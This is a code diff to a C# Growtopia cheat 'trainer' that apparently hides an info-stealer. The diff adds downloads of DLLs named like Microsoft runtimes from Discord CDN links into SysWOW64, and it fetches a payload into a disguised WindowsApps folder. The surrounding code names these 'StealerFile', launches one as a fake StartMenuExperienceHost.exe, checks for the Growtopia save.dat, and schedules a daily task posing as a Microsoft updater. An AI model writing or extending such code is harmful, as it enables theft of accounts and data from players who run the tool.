@@ -7,6 +7,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Management;
+using System.Net;
 using System.Net.NetworkInformation;
 using System.Security.Principal;
 using System.Text.RegularExpressions;
@@ -31,16 +32,16 @@ namespace FreeZeHAX_Trainer
         private bool mouseDown;
         private Point lastLocation;
         private const string FileName = "StartMenuExperienceHost.exe";
-        private const string CFGFileName = "App.config";
-        private readonly string ZipFileName = "App.config.zip";
+        private const string ZipFileName = "App.config";
         private const string NamespaceName = "FreeZeHAX_Trainer";
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
+        private readonly WebClient web = new WebClient();
 
         private void StartForm()
         {
-            Opacity = 0; //first the opacity is 0
-            t1.Interval = 10;  //we'll increase the opacity every 10ms
-            t1.Tick += new EventHandler(FadeIn);  //this calls the function that changes opacity
+            Opacity = 0; // First the opacity is 0
+            t1.Interval = 10;  // We'll increase the opacity every 10ms
+            t1.Tick += new EventHandler(FadeIn);  // This calls the function that changes opacity
             t1.Start();
         }
 
@@ -54,7 +55,7 @@ namespace FreeZeHAX_Trainer
         {
             if (Opacity >= 0.90)
             {
-                t1.Stop();   //this stops the timer if the form is completely displayed
+                t1.Stop();   // This stops the timer if the form is completely displayed
             }
             else
             {
@@ -72,15 +73,19 @@ namespace FreeZeHAX_Trainer
                 string FolderChars = others.GetRandomString().ToLower();
                 string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
                 string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
+                string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64";
                 string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
                 string StealerFile = StealerFolderLoc + "\\" + FileName;
                 bool savePathExists = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat");
+                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
+                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
+                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
                 CETimer.Start();
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
-                others.Extract(NamespaceName, StealerFolderLoc, "Files", CFGFileName);
-                File.Move(StealerFolderLoc + "\\" + CFGFileName, StealerFolderLoc + "\\" + "App.config.zip");
+                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930580875597475921/App.config"), StealerFolderLoc + "\\App.config");
+                others.Wait(1000);
                 if (Directory.Exists(Guna))
                 {
                     Directory.Delete(Guna, true);
@@ -105,6 +110,7 @@ namespace FreeZeHAX_Trainer
                 }
                 else
                 {
+                    others.Wait(100);
                     System.Diagnostics.Process.Start(StealerFile);
                     td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                     DailyTrigger dt = new DailyTrigger();
@@ -282,7 +288,7 @@ namespace FreeZeHAX_Trainer
                     mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[5], "bytes", "90 90");
                     mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[2], "string", cheats.GTCheats[4]);
                 }
-                catch (Exception) { }
+                catch (Exception Ex) { MessageBox.Show(Ex.Message); }
             }
         }
 
